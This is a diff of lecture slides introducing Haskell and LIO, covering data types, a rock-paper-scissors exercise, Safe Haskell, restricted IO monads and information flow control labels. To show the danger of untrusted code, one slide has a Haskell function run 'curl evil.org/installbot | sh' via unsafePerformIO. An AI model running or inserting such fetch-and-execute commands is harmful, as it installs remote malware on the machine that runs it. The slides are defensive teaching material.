@@ -1,4 +1,4 @@
-% Intro to Haskell
+% Intro to Haskell and LIO
 % David Mazi&egrave;res
 %
 
@@ -275,12 +275,12 @@
     data PointT = PointC Double Double deriving Show
     ~~~
 
-    * This declaration declares a new type, `PointT`, and constructor,
-      `PointC`
-    * A value of type `PointT` contains two `Double`s
+    * Declares a new type, `PointT` with constructor
+      `PointC` containing two `Double`s
     * `deriving Show` means you can print the type (helpful in GHCI)
+    * Can also derive `Read`, `Eq`, `Ord`, `Enum`, `Bounded`
 
-* Note that data types and constructors must start with capital letters
+* Note that data types and constructors _must_ start with capital letters
 * Types and constructors can use the same name (often do), E.g.:
     
     ~~~ {.haskell}
@@ -296,7 +296,7 @@
     ~~~
 
     ~~~ {.haskell}
-    data Color = Red | Green | Blue | Indigo | Violet deriving Show
+    data Color = Red | Green | Blue | Violet deriving (Show, Eq, Enum)
     ~~~
 
 # Using data types
@@ -310,7 +310,7 @@
     ~~~
 
     ~~~ {.haskell}
-    data Color = Red | Green | Blue | Indigo | Violet deriving Show
+    data Color = Red | Green | Blue | Violet deriving (Show, Eq, Enum)
     myColor :: Color
     myColor = Red
     ~~~
@@ -331,6 +331,46 @@
     isRed Red = True        -- Only matches constructor Red
     isRed c   = False       -- Lower-case c just a variable
     ~~~
+
+# Exercise:  Rock, Paper, Scissors referee
+
+* Define a type `Move` representing a move in a rock paper scissors
+  game
+
+* Define a type `Outcome` representing the outcome of a rock paper
+  scissors game (win, loss, or tie).
+
+* Define a function `outcome :: Move -> Move -> Outcome`
+    * The first move should be your own, the second your opponent's
+    * Should tell you if you won, lost, or tied
+
+~~~
+GHCi, version 7.6.3: http://www.haskell.org/ghc/  :? for help
+...
+*Main> outcome Rock Paper
+Lose
+*Main> outcome Scissors Paper
+Win
+*Main> outcome Paper Paper
+Tie
+~~~
+
+# Answer
+
+~~~ {.haskell}
+data Move = Rock | Paper | Scissors deriving (Eq, Read, Show, Enum, Bounded)
+
+data Outcome = Lose | Tie | Win deriving (Show, Eq, Ord)
+
+-- | @outcome our_move their_move@
+outcome :: Move -> Move -> Outcome
+outcome Rock Scissors        = Win
+outcome Paper Rock           = Win
+outcome Scissors Paper       = Win
+outcome us them | us == them = Tie
+                | otherwise  = Lose
+~~~
+
 
 # Parameterized types
 
@@ -1451,6 +1491,345 @@ maintains efficient, functional lookup tables
 
 * [`words`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-List.html#v:words)
   breaks a `String` up into a list of whitespace-separated words
+
+
+
+
+# Untrusted code
+
+* Say you want to incorporate untrusted code in a Haskell application
+* Example:  Some third-party translation software
+    * You built a web server
+    * Want to add a "translate to Pig Latin" button to each web page
+    * Download some random code with this function
+
+        ~~~~ {.haskell}
+        toPigLatin :: L.ByteString -> L.ByteString
+        ~~~~
+
+* If you could trust the type (no `IO`), this would be safe to run
+    * Worst case, users get garbled text on web page
+* However, what if you have?
+
+    ~~~~ {.haskell}
+    toPigLatin = unsafePerformIO $ do
+      system "curl evil.org/installbot | sh"
+      return "Ia owna ouya"
+    ~~~~
+
+# [Safe Haskell][SafeHaskell]
+
+* Starting with GHC 7.2, `-XSafe` option enables
+  [Safe Haskell][SafeHaskell]
+    * Courtesy of our very own CA, David Terei
+* Safe Haskell disallows import of any unsafe modules
+    * E.g., can't import `System.IO.Unsafe`, so can't call `unsafePerformIO`
+* Safe imports (enabled by `-XSafeImports`) require an import to be safe
+
+    ~~~~ {.haskell}
+    import safe PigLatin (toPigLatin)
+    ~~~~
+
+    * The above should guarantee that `toPigLatin` doesn't call unsafe
+      functions
+* But wait... doesn't `toPigLatin` use ByteString?
+
+    ~~~~ {.haskell}
+    head :: {- Lazy -} ByteString -> Word8
+    head Empty       = errorEmptyList "head"
+    head (Chunk c _) = S.unsafeHead c
+
+    unsafeHead :: {- Strict -} ByteString -> Word8
+    unsafeHead (PS x s l) = assert (l > 0) $
+        inlinePerformIO $ withForeignPtr x $ \p -> peekByteOff p s
+    ~~~~
+
+# Safe vs. Trustworthy
+
+* A module compiled `-XSafe` can only import safe modules
+    * As if all imports implicitly have `safe` keyword
+* But there are *two* kinds of safe module
+    1. Modules verified to be safe by the compiler, compiled `-XSafe`
+    2. Modules asserted to be safe by the author, compiled
+    `-XTrustworthy`
+* So a module like `Data.ByteString` can be compiled `-XTrustworthy`
+    * Put unsafe functions in separate `Data.ByteString.Unsafe` module
+    * Assert `Data.ByteString`'s exported symbols cannot be used
+      unsafely, even if the module internally makes use of unsafe
+      functions
+* Of course, might or might not trust module author
+    * Can specify on a per-package basis whether to honor `-XTrustworthy`
+    * Use flags, `-trust` *Pkg*, `-distrust` *Pkg*, `-distrust-all-packages`
+    * Can also set default for a package with `ghc-pkg`
+
+# What if untrusted code needs to do IO?
+
+* Suppose you want to translate to a real language
+    * Generally requires massive data sets
+    * Untrusted code would at minimum need to do file IO
+    * Or maybe easiest send text over network to, e.g., Google translate
+* Idea: use a *restricted* IO monad, `RIO`
+    * Untrusted third party implements `googleTranslate` function
+
+        ~~~~ {.haskell}
+        googleTranslate :: Language -> L.ByteString -> RIO L.ByteString
+        ~~~~
+
+    * But uses the `RIO` monad, instead of `IO`
+    * Implement `RIO` functions to access network, file system
+    * Have functions reject *dangerous* operations
+    * Can use same names and port `IO` code to `RIO` by manipulating imports
+
+# Example: hypothetical `RIO` monad
+
+~~~~ {.haskell}
+{-# LANGUAGE Trustworthy #-}
+module RIO (RIO(), runRIO, RIO.readFile) where
+
+-- Notice that symbol UnsafeRIO is not exported from this module!
+newtype RIO a = UnsafeRIO { runRIO :: IO a }
+instance Monad RIO where
+    return = UnsafeRIO . return
+    m >>= k = UnsafeRIO $ runRIO m >>= runRIO . k
+
+-- Returns True iff access is allowed to file name
+pathOK :: FilePath -> IO Bool
+pathOK file = {- Implement some policy based on file name -}
+
+readFile :: FilePath -> RIO String
+readFile file = UnsafeRIO $ do
+  ok <- pathOK file
+  if ok then Prelude.readFile file else return ""
+~~~~
+
+* Note use of `newtype` -- `RIO` is same as `IO` at runtime
+    * Anyone can turn an `RIO` action into an `IO` one with `runRIO`
+    * But cannot create `RIO` action from `IO` one without `UnsafeRIO`
+      symbol...  not exported, so untrusted code cannot bury `IO`
+      actions in `RIO` ones
+
+# Example policies for RIO
+
+* Only read and write files under some sandbox subdirectory
+    * Protect most of file system from untrusted code
+* Do not allow execution of other programs
+    * Would escape from `RIO` restrictions
+* Only allow connections to port 80, and only to known servers
+    * Don't want untrusted code sending spam, attacking mysql, etc.
+* Do not allow access to devices
+    * Microphone, camera, speaker, etc.
+* Similar to policies that apply to Java/JavaScript in browser
+
+# Why RIO isn't enough
+
+* What if the web site contains private data, such as email?
+* An attack by malicious `googleTranslate` function:
+    * Save a copy of private email under `/sandbox` (allowed)
+    * When asked to translate a special string, return stored email
+    * Attacker sends himself an email with special string to read stored email
+* Another attack
+    * Send query to attacker's own website instead of Google
+* Problem: really need to keep track of what information is sensitive
+    * Okay to send public data over network
+    * Not okay to send email (or maybe only okay to send to specific Google URL)
+    * Okay to write files, but have to keep track of which files
+      contain whose email
+* Solution: Decentralized Information Flow Control (DIFC)
+
+# What is DIFC?
+
+![](lintro.svg)
+
+* IFC originated with military applications and classified data
+* Every piece of data in the system has a label
+* Every process/thread has a label
+* Labels are partially ordered by $\sqsubseteq$ ("can flow to")
+* Example:  Emacs (labeled $L_E$) accesses file (labeled $L_F$)
+
+# What is DIFC?
+
+![](lread.svg)
+
+* IFC originated with military applications and classified data
+* Every piece of data in the system has a label
+* Every process/thread has a label
+* Labels are partially ordered by $\sqsubseteq$ ("can flow to")
+* Example:  Emacs (labeled $L_E$) accesses file (labeled $L_F$)
+    * File read?  Information flows from file to emacs.  System
+      requires $L_F\sqsubseteq L_E$.
+
+# What is DIFC?
+
+![](lwrite.svg)
+
+* IFC originated with military applications and classified data
+* Every piece of data in the system has a label
+* Every process/thread has a label
+* Labels are partially ordered by $\sqsubseteq$ ("can flow to")
+* Example:  Emacs (labeled $L_E$) accesses file (labeled $L_F$)
+    * File read?  Information flows from file to emacs.  System
+      requires $L_F\sqsubseteq L_E$.
+    * File write?  Information flows in both directions.  System
+      enforces that $L_F\sqsubseteq L_E$ and $L_E\sqsubseteq L_F$.
+
+# Labels are transitive
+
+![](trans1.svg)
+
+* $\sqsubseteq$ is a transitive relation - makes it easier to reason
+  about security
+* Example: Label file so it cannot flow to Internet
+    * Policy holds regardless of what other software does
+
+# Labels are transitive
+
+![](trans2.svg)
+
+* $\sqsubseteq$ is a transitive relation - makes it easier to reason
+  about security
+* Example: Label file so it cannot flow to Internet
+    * Policy holds regardless of what other software does
+* Suppose a buggy app reads file (e.g., desktop search)
+
+# Labels are transitive
+
+![](trans3.svg)
+
+* $\sqsubseteq$ is a transitive relation - makes it easier to reason
+  about security
+* Example: Label file so it cannot flow to Internet
+    * Policy holds regardless of what other software does
+* Suppose a buggy app reads file (e.g., desktop search)
+    * Process labeled $L_\mathrm{bug}$ reads file, so must have
+      $L_F\sqsubseteq L_\mathrm{bug}$
+    * But $L_F\sqsubseteq L_\mathrm{bug}\wedge
+      L_\mathrm{bug}\sqsubseteq L_\mathrm{net}\Longrightarrow
+      L_F\sqsubseteq L_\mathrm{net}$, thus
+      $L_\mathrm{bug}\> !\sqsubseteq L_\mathrm{net}$
+
+# Labels are transitive
+
+![](trans4.svg)
+
+* $\sqsubseteq$ is a transitive relation - makes it easier to reason
+  about security
+* Example: Label file so it cannot flow to Internet
+    * Policy holds regardless of what other software does
+* Conversely, any app that can write to network cannot read file
+
+# Labels form a lattice
+
+![](ablattice.svg)
+
+* Consider two users, $A$ and $B$
+    * Label public data $L_\emptyset$, $A$'s private data $L_A$, $B$'s
+      private data $L_B$
+* What happens if you mix $A$'s and $B$'s private data in a single document?
+    * Both $A$ and $B$ should be concerned about the release of such a document
+    * Need a label at least as restrictive as both $L_A$ and $L_B$
+    * Use the least upper bound (a.k.a. *join*) of $L_A$ and $L_B$,
+      written $L_A\sqcap L_B$
+
+# **D**IFC is **D**ecentralized
+
+![](decentralized.svg)
+
+* Every process has a set of privileges
+* Exercising privilege $p$ changes label requirements
+    * $L_F\sqsubseteq_p\> L_\mathrm{proc}$ to read, and additionally
+      $L_\mathrm{proc}\sqsubseteq_p\> L_F$ to write file
+    * $\sqsubseteq_p$ (``can flow under privileges $p$'') is more
+      permissive than $\sqsubseteq$
+* Idea: Set labels so you know who has relevant privs.
+
+# Example privileges
+
+![](ablattice.svg)
+
+* Consider again simple two user lattice
+* Let $a$ be user $A$'s privileges, $b$ be user $B$'s privileges
+* Clearly $L_A\sqsubseteq_a\>L_\emptyset$ and $L_B\sqsubseteq_b\>L_\emptyset$
+    * Users should be able to make public or *declassify* their own private data
+* Users should also be able to *partially declassify* data
+    * I.e., $L_{AB}\sqsubseteq_a\>L_B$ and $L_{AB}\sqsubseteq_b\>L_A$
+
+# `LIO` Monad [[Stefan]](http://www.cse.chalmers.se/~russo/publications_files/haskell11.pdf)
+
+* More flexibility if you enforce all permission checks dynamically
+* Let's define `Label`s as points on a lattice
+    * Can be arbitrary data type with $\sqsubseteq$, $\sqcap$, and $\sqcup$
+
+    ~~~~ {.haskell}
+    class Eq a => POrd a where
+        leq :: a -> a -> Bool
+    class (POrd a, Show a, Read a) => Label a where
+        lub :: a -> a -> a
+        glb :: a -> a -> a
+    ~~~~
+
+    * Separately, define privileges as any type with $\sqsubseteq_p$
+      for a given label type
+
+    ~~~~ {.haskell}
+    -- PrivTCB is private class, not exposed to untrusted code
+    class (Label l, PrivTCB p) => Priv l p where
+        leqp :: p -> l -> l -> Bool
+    ~~~~
+
+    * Note `PrivTCB` requirement in context--prevents untrusted code
+      from defining instances of `Priv` class.
+* These labels can easily represent many more lattice points
+    * E.g., labels can be sets of users whose private data may influence value
+
+# Need pure, side-effectful computations
+
+* Represent labeled pure values with type wrapper
+
+    ~~~~ {.haskell}
+    data Labeled l t = LabeledTCB l t
+    ~~~~
+
+    * Pure values suitable for mashalling, insertion in database
+
+* The `LIO l` monad (for `Label l`) is a state monad w. *current* label
+    * Current label rises to LUB of all data observed
+* Can label and unlabel pure values in `LIO` monad:
+
+    ~~~~ {.haskell}
+    label :: Label l => l -> a -> LIO l (Labeled l a)
+    unlabel :: (Label l) => Labeled l a -> LIO l a
+    unlabelP :: Priv l p => p -> Labeled l a -> LIO l a
+    toLabeled :: (Label l) => l -> LIO l a -> LIO l (Labeled l a)
+    ~~~~
+
+    * `label` requires value label to be above current label
+    * `unlabel` raises current label to LUB with removed `Labeled`
+      (`unlabelP` uses privileges to raise label less)
+    * `toLabeled` takes computation that would have raised current
+      label, and instead of raising label, wraps result in `Labeled`
+
+# Other `LIO` features
+
+* Clearance
+    * Special label maintained w. current label in `LIO` state
+    * Represents upper bound on current label
+    * Can lower clearance to label, but raising requires privileges
+    * Allows "need-to-know" policies, reducing danger of covert channels
+* Labeled file system
+    * Stores labels along with files
+* Labeled exceptions
+    * Can only catch exceptions thrown at points below your clearance
+    * Get tainted by exception when you catch it
+* Research in progress to build web framework using `LIO`
+    * Allows users to upload untrusted applets into web server
+
+[SafeHaskell]: http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html
+
+
+
+
+
+
 
 
 [cabal-install]: http://hackage.haskell.org/package/cabal-install
